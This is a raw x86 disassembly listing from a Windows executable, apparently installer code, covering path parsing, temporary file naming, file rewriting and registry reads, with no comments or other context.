  405eca:	c2 08 00             	ret    $0x8
  405ecd:	56                   	push   %esi
  405ece:	8b 74 24 08          	mov    0x8(%esp),%esi
  405ed2:	56                   	push   %esi
  405ed3:	e8 f0 06 00 00       	call   0x4065c8
  405ed8:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405edb:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405edf:	74 0c                	je     0x405eed
  405ee1:	50                   	push   %eax
  405ee2:	56                   	push   %esi
  405ee3:	ff 15 fc 81 40 00    	call   *0x4081fc
  405ee9:	3b c6                	cmp    %esi,%eax
  405eeb:	77 ee                	ja     0x405edb
  405eed:	66 83 20 00          	andw   $0x0,(%eax)
  405ef1:	83 c0 02             	add    $0x2,%eax
  405ef4:	5e                   	pop    %esi
  405ef5:	c2 04 00             	ret    $0x4
  405ef8:	8b 54 24 04          	mov    0x4(%esp),%edx
  405efc:	66 8b 0a             	mov    (%edx),%cx
  405eff:	8b c1                	mov    %ecx,%eax
  405f01:	0c 20                	or     $0x20,%al
  405f03:	66 83 f9 5c          	cmp    $0x5c,%cx
  405f07:	75 06                	jne    0x405f0f
  405f09:	66 39 4a 02          	cmp    %cx,0x2(%edx)
  405f0d:	74 13                	je     0x405f22
  405f0f:	66 3d 61 00          	cmp    $0x61,%ax
  405f13:	72 12                	jb     0x405f27
  405f15:	66 3d 7a 00          	cmp    $0x7a,%ax
  405f19:	77 0c                	ja     0x405f27
  405f1b:	66 83 7a 02 3a       	cmpw   $0x3a,0x2(%edx)
  405f20:	75 05                	jne    0x405f27
  405f22:	33 c0                	xor    %eax,%eax
  405f24:	40                   	inc    %eax
  405f25:	eb 02                	jmp    0x405f29
  405f27:	33 c0                	xor    %eax,%eax
  405f29:	c2 04 00             	ret    $0x4
  405f2c:	53                   	push   %ebx
  405f2d:	56                   	push   %esi
  405f2e:	8b 35 08 82 40 00    	mov    0x408208,%esi
  405f34:	57                   	push   %edi
  405f35:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405f39:	57                   	push   %edi
  405f3a:	ff d6                	call   *%esi
  405f3c:	8b d8                	mov    %eax,%ebx
  405f3e:	53                   	push   %ebx
  405f3f:	ff d6                	call   *%esi
  405f41:	66 8b 0f             	mov    (%edi),%cx
  405f44:	66 85 c9             	test   %cx,%cx
  405f47:	74 12                	je     0x405f5b
  405f49:	66 83 3b 3a          	cmpw   $0x3a,(%ebx)
  405f4d:	75 0c                	jne    0x405f5b
  405f4f:	66 83 7b 02 5c       	cmpw   $0x5c,0x2(%ebx)
  405f54:	75 05                	jne    0x405f5b
  405f56:	50                   	push   %eax
  405f57:	ff d6                	call   *%esi
  405f59:	eb 28                	jmp    0x405f83
  405f5b:	66 83 f9 5c          	cmp    $0x5c,%cx
  405f5f:	75 20                	jne    0x405f81
  405f61:	66 39 4f 02          	cmp    %cx,0x2(%edi)
  405f65:	75 1a                	jne    0x405f81
  405f67:	6a 02                	push   $0x2
  405f69:	5e                   	pop    %esi
  405f6a:	6a 5c                	push   $0x5c
  405f6c:	50                   	push   %eax
  405f6d:	4e                   	dec    %esi
  405f6e:	e8 3b ff ff ff       	call   0x405eae
  405f73:	66 83 38 00          	cmpw   $0x0,(%eax)
  405f77:	74 08                	je     0x405f81
  405f79:	40                   	inc    %eax
  405f7a:	40                   	inc    %eax
  405f7b:	85 f6                	test   %esi,%esi
  405f7d:	75 eb                	jne    0x405f6a
  405f7f:	eb 02                	jmp    0x405f83
  405f81:	33 c0                	xor    %eax,%eax
  405f83:	5f                   	pop    %edi
  405f84:	5e                   	pop    %esi
  405f85:	5b                   	pop    %ebx
  405f86:	c2 04 00             	ret    $0x4
  405f89:	56                   	push   %esi
  405f8a:	57                   	push   %edi
  405f8b:	ff 74 24 0c          	push   0xc(%esp)
  405f8f:	be 70 f2 42 00       	mov    $0x42f270,%esi
  405f94:	56                   	push   %esi
  405f95:	e8 18 06 00 00       	call   0x4065b2
  405f9a:	56                   	push   %esi
  405f9b:	e8 8c ff ff ff       	call   0x405f2c
  405fa0:	8b f8                	mov    %eax,%edi
  405fa2:	85 ff                	test   %edi,%edi
  405fa4:	75 04                	jne    0x405faa
  405fa6:	33 c0                	xor    %eax,%eax
  405fa8:	eb 58                	jmp    0x406002
  405faa:	57                   	push   %edi
  405fab:	e8 b0 08 00 00       	call   0x406860
  405fb0:	f6 05 18 47 43 00 80 	testb  $0x80,0x434718
  405fb7:	74 0e                	je     0x405fc7
  405fb9:	66 8b 07             	mov    (%edi),%ax
  405fbc:	66 85 c0             	test   %ax,%ax
  405fbf:	74 e5                	je     0x405fa6
  405fc1:	66 3d 5c 00          	cmp    $0x5c,%ax
  405fc5:	74 df                	je     0x405fa6
  405fc7:	2b fe                	sub    %esi,%edi
  405fc9:	d1 ff                	sar    $1,%edi
  405fcb:	eb 14                	jmp    0x405fe1
  405fcd:	e8 3d 09 00 00       	call   0x40690f
  405fd2:	85 c0                	test   %eax,%eax
  405fd4:	74 05                	je     0x405fdb
  405fd6:	f6 00 10             	testb  $0x10,(%eax)
  405fd9:	74 cb                	je     0x405fa6
  405fdb:	56                   	push   %esi
  405fdc:	e8 ec fe ff ff       	call   0x405ecd
  405fe1:	56                   	push   %esi
  405fe2:	e8 e1 05 00 00       	call   0x4065c8
  405fe7:	3b c7                	cmp    %edi,%eax
  405fe9:	56                   	push   %esi
  405fea:	7f e1                	jg     0x405fcd
  405fec:	e8 90 fe ff ff       	call   0x405e81
  405ff1:	56                   	push   %esi
  405ff2:	ff 15 dc 80 40 00    	call   *0x4080dc
  405ff8:	33 c9                	xor    %ecx,%ecx
  405ffa:	83 f8 ff             	cmp    $0xffffffff,%eax
  405ffd:	0f 95 c1             	setne  %cl
  406000:	8b c1                	mov    %ecx,%eax
  406002:	5f                   	pop    %edi
  406003:	5e                   	pop    %esi
  406004:	c2 04 00             	ret    $0x4
  406007:	55                   	push   %ebp
  406008:	8b ec                	mov    %esp,%ebp
  40600a:	51                   	push   %ecx
  40600b:	53                   	push   %ebx
  40600c:	56                   	push   %esi
  40600d:	57                   	push   %edi
  40600e:	8b 3d 28 81 40 00    	mov    0x408128,%edi
  406014:	ff 75 0c             	push   0xc(%ebp)
  406017:	ff d7                	call   *%edi
  406019:	8b 75 08             	mov    0x8(%ebp),%esi
  40601c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40601f:	eb 27                	jmp    0x406048
  406021:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406024:	ff 75 0c             	push   0xc(%ebp)
  406027:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  40602a:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  40602e:	56                   	push   %esi
  40602f:	ff 15 6c 80 40 00    	call   *0x40806c
  406035:	85 c0                	test   %eax,%eax
  406037:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40603a:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  40603d:	74 1a                	je     0x406059
  40603f:	56                   	push   %esi
  406040:	ff 15 74 82 40 00    	call   *0x408274
  406046:	8b f0                	mov    %eax,%esi
  406048:	56                   	push   %esi
  406049:	ff d7                	call   *%edi
  40604b:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  40604e:	7d d1                	jge    0x406021
  406050:	33 c0                	xor    %eax,%eax
  406052:	5f                   	pop    %edi
  406053:	5e                   	pop    %esi
  406054:	5b                   	pop    %ebx
  406055:	c9                   	leave
  406056:	c2 08 00             	ret    $0x8
  406059:	8b c6                	mov    %esi,%eax
  40605b:	eb f5                	jmp    0x406052
  40605d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  406061:	56                   	push   %esi
  406062:	8b 74 24 10          	mov    0x10(%esp),%esi
  406066:	85 f6                	test   %esi,%esi
  406068:	76 0f                	jbe    0x406079
  40606a:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40606e:	2b c1                	sub    %ecx,%eax
  406070:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  406073:	88 11                	mov    %dl,(%ecx)
  406075:	41                   	inc    %ecx
  406076:	4e                   	dec    %esi
  406077:	75 f7                	jne    0x406070
  406079:	5e                   	pop    %esi
  40607a:	c2 0c 00             	ret    $0xc
  40607d:	56                   	push   %esi
  40607e:	ff 74 24 08          	push   0x8(%esp)
  406082:	ff 15 dc 80 40 00    	call   *0x4080dc
  406088:	8b f0                	mov    %eax,%esi
  40608a:	83 fe ff             	cmp    $0xffffffff,%esi
  40608d:	74 0d                	je     0x40609c
  40608f:	24 fe                	and    $0xfe,%al
  406091:	50                   	push   %eax
  406092:	ff 74 24 0c          	push   0xc(%esp)
  406096:	ff 15 d8 80 40 00    	call   *0x4080d8
  40609c:	8b c6                	mov    %esi,%eax
  40609e:	5e                   	pop    %esi
  40609f:	c2 04 00             	ret    $0x4
  4060a2:	ff 74 24 04          	push   0x4(%esp)
  4060a6:	ff 15 dc 80 40 00    	call   *0x4080dc
  4060ac:	8b c8                	mov    %eax,%ecx
  4060ae:	6a 00                	push   $0x0
  4060b0:	41                   	inc    %ecx
  4060b1:	f7 d9                	neg    %ecx
  4060b3:	1b c9                	sbb    %ecx,%ecx
  4060b5:	23 c8                	and    %eax,%ecx
  4060b7:	51                   	push   %ecx
  4060b8:	ff 74 24 14          	push   0x14(%esp)
  4060bc:	6a 00                	push   $0x0
  4060be:	6a 01                	push   $0x1
  4060c0:	ff 74 24 1c          	push   0x1c(%esp)
  4060c4:	ff 74 24 1c          	push   0x1c(%esp)
  4060c8:	ff 15 70 80 40 00    	call   *0x408070
  4060ce:	c2 0c 00             	ret    $0xc
  4060d1:	55                   	push   %ebp
  4060d2:	8b ec                	mov    %esp,%ebp
  4060d4:	51                   	push   %ecx
  4060d5:	51                   	push   %ecx
  4060d6:	56                   	push   %esi
  4060d7:	8b 75 08             	mov    0x8(%ebp),%esi
  4060da:	57                   	push   %edi
  4060db:	6a 64                	push   $0x64
  4060dd:	5f                   	pop    %edi
  4060de:	a1 78 a5 40 00       	mov    0x40a578,%eax
  4060e3:	4f                   	dec    %edi
  4060e4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4060e7:	a1 7c a5 40 00       	mov    0x40a57c,%eax
  4060ec:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4060ef:	ff 15 d0 80 40 00    	call   *0x4080d0
  4060f5:	6a 1a                	push   $0x1a
  4060f7:	33 d2                	xor    %edx,%edx
  4060f9:	59                   	pop    %ecx
  4060fa:	f7 f1                	div    %ecx
  4060fc:	56                   	push   %esi
  4060fd:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406100:	6a 00                	push   $0x0
  406102:	50                   	push   %eax
  406103:	ff 75 0c             	push   0xc(%ebp)
  406106:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  40610a:	ff 15 74 80 40 00    	call   *0x408074
  406110:	85 c0                	test   %eax,%eax
  406112:	75 0d                	jne    0x406121
  406114:	85 ff                	test   %edi,%edi
  406116:	75 c6                	jne    0x4060de
  406118:	66 21 3e             	and    %di,(%esi)
  40611b:	5f                   	pop    %edi
  40611c:	5e                   	pop    %esi
  40611d:	c9                   	leave
  40611e:	c2 08 00             	ret    $0x8
  406121:	8b c6                	mov    %esi,%eax
  406123:	eb f6                	jmp    0x40611b
  406125:	55                   	push   %ebp
  406126:	8b ec                	mov    %esp,%ebp
  406128:	56                   	push   %esi
  406129:	8b 75 10             	mov    0x10(%ebp),%esi
  40612c:	8d 45 10             	lea    0x10(%ebp),%eax
  40612f:	6a 00                	push   $0x0
  406131:	50                   	push   %eax
  406132:	56                   	push   %esi
  406133:	ff 75 0c             	push   0xc(%ebp)
  406136:	ff 75 08             	push   0x8(%ebp)
  406139:	ff 15 30 81 40 00    	call   *0x408130
  40613f:	85 c0                	test   %eax,%eax
  406141:	74 0a                	je     0x40614d
  406143:	3b 75 10             	cmp    0x10(%ebp),%esi
  406146:	75 05                	jne    0x40614d
  406148:	33 c0                	xor    %eax,%eax
  40614a:	40                   	inc    %eax
  40614b:	eb 02                	jmp    0x40614f
  40614d:	33 c0                	xor    %eax,%eax
  40614f:	5e                   	pop    %esi
  406150:	5d                   	pop    %ebp
  406151:	c2 0c 00             	ret    $0xc
  406154:	55                   	push   %ebp
  406155:	8b ec                	mov    %esp,%ebp
  406157:	56                   	push   %esi
  406158:	8b 75 10             	mov    0x10(%ebp),%esi
  40615b:	8d 45 10             	lea    0x10(%ebp),%eax
  40615e:	6a 00                	push   $0x0
  406160:	50                   	push   %eax
  406161:	56                   	push   %esi
  406162:	ff 75 0c             	push   0xc(%ebp)
  406165:	ff 75 08             	push   0x8(%ebp)
  406168:	ff 15 b8 80 40 00    	call   *0x4080b8
  40616e:	85 c0                	test   %eax,%eax
  406170:	74 0a                	je     0x40617c
  406172:	3b 75 10             	cmp    0x10(%ebp),%esi
  406175:	75 05                	jne    0x40617c
  406177:	33 c0                	xor    %eax,%eax
  406179:	40                   	inc    %eax
  40617a:	eb 02                	jmp    0x40617e
  40617c:	33 c0                	xor    %eax,%eax
  40617e:	5e                   	pop    %esi
  40617f:	5d                   	pop    %ebp
  406180:	c2 0c 00             	ret    $0xc
  406183:	55                   	push   %ebp
  406184:	8b ec                	mov    %esp,%ebp
  406186:	53                   	push   %ebx
  406187:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40618a:	56                   	push   %esi
  40618b:	8b 35 34 81 40 00    	mov    0x408134,%esi
  406191:	57                   	push   %edi
  406192:	33 ff                	xor    %edi,%edi
  406194:	6a 01                	push   $0x1
  406196:	57                   	push   %edi
  406197:	57                   	push   %edi
  406198:	53                   	push   %ebx
  406199:	ff d6                	call   *%esi
  40619b:	85 c0                	test   %eax,%eax
  40619d:	75 4f                	jne    0x4061ee
  40619f:	8d 45 0a             	lea    0xa(%ebp),%eax
  4061a2:	6a 02                	push   $0x2
  4061a4:	50                   	push   %eax
  4061a5:	53                   	push   %ebx
  4061a6:	e8 7a ff ff ff       	call   0x406125
  4061ab:	85 c0                	test   %eax,%eax
  4061ad:	74 0c                	je     0x4061bb
  4061af:	66 81 7d 0a ff fe    	cmpw   $0xfeff,0xa(%ebp)
  4061b5:	75 04                	jne    0x4061bb
  4061b7:	33 c0                	xor    %eax,%eax
  4061b9:	eb 36                	jmp    0x4061f1
  4061bb:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  4061be:	74 28                	je     0x4061e8
  4061c0:	6a 01                	push   $0x1
  4061c2:	57                   	push   %edi
  4061c3:	57                   	push   %edi
  4061c4:	53                   	push   %ebx
  4061c5:	ff d6                	call   *%esi
  4061c7:	85 c0                	test   %eax,%eax
  4061c9:	75 1d                	jne    0x4061e8
  4061cb:	6a 02                	push   $0x2
  4061cd:	68 14 84 40 00       	push   $0x408414
  4061d2:	53                   	push   %ebx
  4061d3:	e8 7c ff ff ff       	call   0x406154
  4061d8:	f7 d8                	neg    %eax
  4061da:	1b c0                	sbb    %eax,%eax
  4061dc:	25 fb bf ff 7f       	and    $0x7fffbffb,%eax
  4061e1:	05 05 40 00 80       	add    $0x80004005,%eax
  4061e6:	eb 09                	jmp    0x4061f1
  4061e8:	57                   	push   %edi
  4061e9:	57                   	push   %edi
  4061ea:	57                   	push   %edi
  4061eb:	53                   	push   %ebx
  4061ec:	ff d6                	call   *%esi
  4061ee:	33 c0                	xor    %eax,%eax
  4061f0:	40                   	inc    %eax
  4061f1:	5f                   	pop    %edi
  4061f2:	5e                   	pop    %esi
  4061f3:	5b                   	pop    %ebx
  4061f4:	5d                   	pop    %ebp
  4061f5:	c2 08 00             	ret    $0x8
  4061f8:	53                   	push   %ebx
  4061f9:	8b 1d ec 80 40 00    	mov    0x4080ec,%ebx
  4061ff:	55                   	push   %ebp
  406200:	56                   	push   %esi
  406201:	8b 74 24 14          	mov    0x14(%esp),%esi
  406205:	57                   	push   %edi
  406206:	85 f6                	test   %esi,%esi
  406208:	c7 05 08 01 43 00 4e 	movl   $0x55004e,0x430108
  40620f:	00 55 00 
  406212:	c7 05 0c 01 43 00 4c 	movl   $0x4c,0x43010c
  406219:	00 00 00 
  40621c:	bf 00 04 00 00       	mov    $0x400,%edi
  406221:	bd 08 01 43 00       	mov    $0x430108,%ebp
  406226:	74 26                	je     0x40624e
  406228:	6a 01                	push   $0x1
  40622a:	6a 00                	push   $0x0
  40622c:	56                   	push   %esi
  40622d:	e8 70 fe ff ff       	call   0x4060a2
  406232:	50                   	push   %eax
  406233:	ff 15 fc 80 40 00    	call   *0x4080fc
  406239:	57                   	push   %edi
  40623a:	55                   	push   %ebp
  40623b:	56                   	push   %esi
  40623c:	ff d3                	call   *%ebx
  40623e:	85 c0                	test   %eax,%eax
  406240:	0f 84 27 01 00 00    	je     0x40636d
  406246:	3b c7                	cmp    %edi,%eax
  406248:	0f 8f 1f 01 00 00    	jg     0x40636d
  40624e:	be 08 09 43 00       	mov    $0x430908,%esi
  406253:	57                   	push   %edi
  406254:	56                   	push   %esi
  406255:	ff 74 24 1c          	push   0x1c(%esp)
  406259:	ff d3                	call   *%ebx
  40625b:	85 c0                	test   %eax,%eax
  40625d:	0f 84 0a 01 00 00    	je     0x40636d
  406263:	3b c7                	cmp    %edi,%eax
  406265:	0f 8f 02 01 00 00    	jg     0x40636d
  40626b:	56                   	push   %esi
  40626c:	55                   	push   %ebp
  40626d:	68 90 a5 40 00       	push   $0x40a590
  406272:	68 08 fd 42 00       	push   $0x42fd08
  406277:	ff 15 78 82 40 00    	call   *0x408278
  40627d:	8b d8                	mov    %eax,%ebx
  40627f:	a1 10 47 43 00       	mov    0x434710,%eax
  406284:	83 c4 10             	add    $0x10,%esp
  406287:	ff b0 28 01 00 00    	push   0x128(%eax)
  40628d:	56                   	push   %esi
  40628e:	e8 5c 03 00 00       	call   0x4065ef
  406293:	6a 04                	push   $0x4
  406295:	68 00 00 00 c0       	push   $0xc0000000
  40629a:	56                   	push   %esi
  40629b:	e8 02 fe ff ff       	call   0x4060a2
  4062a0:	8b e8                	mov    %eax,%ebp
  4062a2:	83 fd ff             	cmp    $0xffffffff,%ebp
  4062a5:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  4062a9:	0f 84 be 00 00 00    	je     0x40636d
  4062af:	6a 00                	push   $0x0
  4062b1:	55                   	push   %ebp
  4062b2:	ff 15 cc 80 40 00    	call   *0x4080cc
  4062b8:	8b f8                	mov    %eax,%edi
  4062ba:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  4062be:	50                   	push   %eax
  4062bf:	6a 40                	push   $0x40
  4062c1:	ff 15 10 81 40 00    	call   *0x408110
  4062c7:	8b f0                	mov    %eax,%esi
  4062c9:	85 f6                	test   %esi,%esi
  4062cb:	0f 84 95 00 00 00    	je     0x406366
  4062d1:	57                   	push   %edi
  4062d2:	56                   	push   %esi
  4062d3:	55                   	push   %ebp
  4062d4:	e8 4c fe ff ff       	call   0x406125
  4062d9:	85 c0                	test   %eax,%eax
  4062db:	0f 84 85 00 00 00    	je     0x406366
  4062e1:	68 84 a5 40 00       	push   $0x40a584
  4062e6:	56                   	push   %esi
  4062e7:	e8 1b fd ff ff       	call   0x406007
  4062ec:	85 c0                	test   %eax,%eax
  4062ee:	75 14                	jne    0x406304
  4062f0:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  4062f3:	68 84 a5 40 00       	push   $0x40a584
  4062f8:	50                   	push   %eax
  4062f9:	ff 15 4c 81 40 00    	call   *0x40814c
  4062ff:	83 c7 0a             	add    $0xa,%edi
  406302:	eb 35                	jmp    0x406339
  406304:	83 c0 0a             	add    $0xa,%eax
  406307:	68 80 a5 40 00       	push   $0x40a580
  40630c:	50                   	push   %eax
  40630d:	e8 f5 fc ff ff       	call   0x406007
  406312:	8b e8                	mov    %eax,%ebp
  406314:	85 ed                	test   %ebp,%ebp
  406316:	74 1d                	je     0x406335
  406318:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  40631b:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  40631e:	eb 06                	jmp    0x406326
  406320:	8a 11                	mov    (%ecx),%dl
  406322:	88 10                	mov    %dl,(%eax)
  406324:	48                   	dec    %eax
  406325:	49                   	dec    %ecx
  406326:	3b cd                	cmp    %ebp,%ecx
  406328:	77 f6                	ja     0x406320
  40632a:	2b ee                	sub    %esi,%ebp
  40632c:	45                   	inc    %ebp
  40632d:	8b c5                	mov    %ebp,%eax
  40632f:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  406333:	eb 06                	jmp    0x40633b
  406335:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  406339:	8b c7                	mov    %edi,%eax
  40633b:	53                   	push   %ebx
  40633c:	03 c6                	add    %esi,%eax
  40633e:	68 08 fd 42 00       	push   $0x42fd08
  406343:	50                   	push   %eax
  406344:	e8 14 fd ff ff       	call   0x40605d
  406349:	33 c0                	xor    %eax,%eax
  40634b:	50                   	push   %eax
  40634c:	50                   	push   %eax
  40634d:	50                   	push   %eax
  40634e:	55                   	push   %ebp
  40634f:	ff 15 34 81 40 00    	call   *0x408134
  406355:	03 fb                	add    %ebx,%edi
  406357:	57                   	push   %edi
  406358:	56                   	push   %esi
  406359:	55                   	push   %ebp
  40635a:	e8 f5 fd ff ff       	call   0x406154
  40635f:	56                   	push   %esi
  406360:	ff 15 0c 81 40 00    	call   *0x40810c
  406366:	55                   	push   %ebp
  406367:	ff 15 fc 80 40 00    	call   *0x4080fc
  40636d:	5f                   	pop    %edi
  40636e:	5e                   	pop    %esi
  40636f:	5d                   	pop    %ebp
  406370:	5b                   	pop    %ebx
  406371:	c3                   	ret
  406372:	6a 05                	push   $0x5
  406374:	ff 74 24 0c          	push   0xc(%esp)
  406378:	ff 74 24 0c          	push   0xc(%esp)
  40637c:	ff 15 50 81 40 00    	call   *0x408150
  406382:	85 c0                	test   %eax,%eax
  406384:	75 0f                	jne    0x406395
  406386:	ff 74 24 08          	push   0x8(%esp)
  40638a:	ff 74 24 08          	push   0x8(%esp)
  40638e:	e8 65 fe ff ff       	call   0x4061f8
  406393:	59                   	pop    %ecx
  406394:	59                   	pop    %ecx
  406395:	ff 05 90 47 43 00    	incl   0x434790
  40639b:	c2 08 00             	ret    $0x8
  40639e:	53                   	push   %ebx
  40639f:	33 db                	xor    %ebx,%ebx
  4063a1:	38 1d bc 47 43 00    	cmp    %bl,0x4347bc
  4063a7:	56                   	push   %esi
  4063a8:	8b 74 24 10          	mov    0x10(%esp),%esi
  4063ac:	57                   	push   %edi
  4063ad:	0f 9c c3             	setl   %bl
  4063b0:	8b 06                	mov    (%esi),%eax
  4063b2:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4063b6:	f7 db                	neg    %ebx
  4063b8:	1b db                	sbb    %ebx,%ebx
  4063ba:	32 db                	xor    %bl,%bl
  4063bc:	81 c3 00 01 00 00    	add    $0x100,%ebx
  4063c2:	a8 20                	test   $0x20,%al
  4063c4:	74 32                	je     0x4063f8
  4063c6:	f7 c7 00 00 00 60    	test   $0x60000000,%edi
  4063cc:	74 2a                	je     0x4063f8
  4063ce:	8b cf                	mov    %edi,%ecx
  4063d0:	ba 00 03 00 00       	mov    $0x300,%edx
  4063d5:	c1 e9 15             	shr    $0x15,%ecx
  4063d8:	23 ca                	and    %edx,%ecx
  4063da:	3b ca                	cmp    %edx,%ecx
  4063dc:	75 0a                	jne    0x4063e8
  4063de:	8b cb                	mov    %ebx,%ecx
  4063e0:	f7 d1                	not    %ecx
  4063e2:	23 0d b0 47 43 00    	and    0x4347b0,%ecx
  4063e8:	80 e4 fe             	and    $0xfe,%ah
  4063eb:	0b c1                	or     %ecx,%eax
  4063ed:	80 e4 fd             	and    $0xfd,%ah
  4063f0:	81 e7 ff ff ff 9f    	and    $0x9fffffff,%edi
  4063f6:	eb 0d                	jmp    0x406405
  4063f8:	a9 00 00 10 00       	test   $0x100000,%eax
  4063fd:	74 06                	je     0x406405
  4063ff:	0b 05 b0 47 43 00    	or     0x4347b0,%eax
  406405:	8b c8                	mov    %eax,%ecx
  406407:	23 c3                	and    %ebx,%eax
  406409:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  40640f:	f7 d8                	neg    %eax
  406411:	1b c0                	sbb    %eax,%eax
  406413:	89 0e                	mov    %ecx,(%esi)
  406415:	f7 d0                	not    %eax
  406417:	23 c7                	and    %edi,%eax
  406419:	5f                   	pop    %edi
  40641a:	5e                   	pop    %esi
  40641b:	5b                   	pop    %ebx
  40641c:	c2 08 00             	ret    $0x8
  40641f:	55                   	push   %ebp
  406420:	8b ec                	mov    %esp,%ebp
  406422:	8d 45 10             	lea    0x10(%ebp),%eax
  406425:	50                   	push   %eax
  406426:	ff 75 08             	push   0x8(%ebp)
  406429:	e8 70 ff ff ff       	call   0x40639e
  40642e:	85 c0                	test   %eax,%eax
  406430:	75 05                	jne    0x406437
  406432:	6a 06                	push   $0x6
  406434:	58                   	pop    %eax
  406435:	eb 12                	jmp    0x406449
  406437:	ff 75 14             	push   0x14(%ebp)
  40643a:	ff 75 10             	push   0x10(%ebp)
  40643d:	6a 00                	push   $0x0
  40643f:	ff 75 0c             	push   0xc(%ebp)
  406442:	50                   	push   %eax
  406443:	ff 15 28 80 40 00    	call   *0x408028
  406449:	5d                   	pop    %ebp
  40644a:	c2 10 00             	ret    $0x10
  40644d:	55                   	push   %ebp
  40644e:	8b ec                	mov    %esp,%ebp
  406450:	8d 45 10             	lea    0x10(%ebp),%eax
  406453:	50                   	push   %eax
  406454:	ff 75 08             	push   0x8(%ebp)
  406457:	e8 42 ff ff ff       	call   0x40639e
  40645c:	33 c9                	xor    %ecx,%ecx
  40645e:	3b c1                	cmp    %ecx,%eax
  406460:	75 05                	jne    0x406467
  406462:	6a 06                	push   $0x6
  406464:	58                   	pop    %eax
  406465:	eb 15                	jmp    0x40647c
  406467:	51                   	push   %ecx
  406468:	ff 75 14             	push   0x14(%ebp)
  40646b:	51                   	push   %ecx
  40646c:	ff 75 10             	push   0x10(%ebp)
  40646f:	51                   	push   %ecx
  406470:	51                   	push   %ecx
  406471:	51                   	push   %ecx
  406472:	ff 75 0c             	push   0xc(%ebp)
  406475:	50                   	push   %eax
  406476:	ff 15 2c 80 40 00    	call   *0x40802c
  40647c:	5d                   	pop    %ebp
  40647d:	c2 10 00             	ret    $0x10
  406480:	55                   	push   %ebp
  406481:	8b ec                	mov    %esp,%ebp
  406483:	51                   	push   %ecx
  406484:	8d 45 18             	lea    0x18(%ebp),%eax
  406487:	56                   	push   %esi
  406488:	50                   	push   %eax
  406489:	8b 45 18             	mov    0x18(%ebp),%eax
  40648c:	f7 d8                	neg    %eax
  40648e:	1b c0                	sbb    %eax,%eax
  406490:	c7 45 fc 00 08 00 00 	movl   $0x800,-0x4(%ebp)
  406497:	25 00 01 00 00       	and    $0x100,%eax
  40649c:	0d 19 00 02 00       	or     $0x20019,%eax
  4064a1:	50                   	push   %eax
  4064a2:	ff 75 0c             	push   0xc(%ebp)
  4064a5:	ff 75 08             	push   0x8(%ebp)
  4064a8:	e8 72 ff ff ff       	call   0x40641f
  4064ad:	8b 75 14             	mov    0x14(%ebp),%esi
  4064b0:	85 c0                	test   %eax,%eax
  4064b2:	75 3c                	jne    0x4064f0
  4064b4:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4064b7:	57                   	push   %edi
  4064b8:	50                   	push   %eax
  4064b9:	8d 45 0c             	lea    0xc(%ebp),%eax
  4064bc:	56                   	push   %esi
  4064bd:	50                   	push   %eax
  4064be:	6a 00                	push   $0x0
  4064c0:	ff 75 10             	push   0x10(%ebp)
  4064c3:	ff 75 18             	push   0x18(%ebp)
  4064c6:	ff 15 08 80 40 00    	call   *0x408008
  4064cc:	ff 75 18             	push   0x18(%ebp)
  4064cf:	8b f8                	mov    %eax,%edi
  4064d1:	ff 15 10 80 40 00    	call   *0x408010
  4064d7:	66 83 a6 fe 07 00 00 	andw   $0x0,0x7fe(%esi)
  4064de:	00 
  4064df:	85 ff                	test   %edi,%edi
  4064e1:	5f                   	pop    %edi
  4064e2:	75 0c                	jne    0x4064f0
  4064e4:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  4064e8:	74 0a                	je     0x4064f4
  4064ea:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  4064ee:	74 04                	je     0x4064f4
  4064f0:	66 83 26 00          	andw   $0x0,(%esi)
  4064f4:	5e                   	pop    %esi
  4064f5:	c9                   	leave
  4064f6:	c2 14 00             	ret    $0x14
  4064f9:	ff 74 24 08          	push   0x8(%esp)
  4064fd:	68 18 84 40 00       	push   $0x408418
  406502:	ff 74 24 0c          	push   0xc(%esp)
  406506:	ff 15 2c 82 40 00    	call   *0x40822c
  40650c:	83 c4 0c             	add    $0xc,%esp
  40650f:	c2 08 00             	ret    $0x8
  406512:	55                   	push   %ebp
  406513:	8b ec                	mov    %esp,%ebp
  406515:	51                   	push   %ecx
  406516:	51                   	push   %ecx
  406517:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40651a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40651e:	53                   	push   %ebx
  40651f:	56                   	push   %esi
  406520:	66 83 39 2d          	cmpw   $0x2d,(%ecx)
  406524:	6a 0a                	push   $0xa
  406526:	58                   	pop    %eax
  406527:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40652e:	6a 39                	push   $0x39
  406530:	5b                   	pop    %ebx
  406531:	75 06                	jne    0x406539
  406533:	41                   	inc    %ecx
  406534:	41                   	inc    %ecx
  406535:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  406539:	66 83 39 30          	cmpw   $0x30,(%ecx)
  40653d:	75 27                	jne    0x406566
  40653f:	41                   	inc    %ecx
  406540:	41                   	inc    %ecx
  406541:	66 8b 11             	mov    (%ecx),%dx
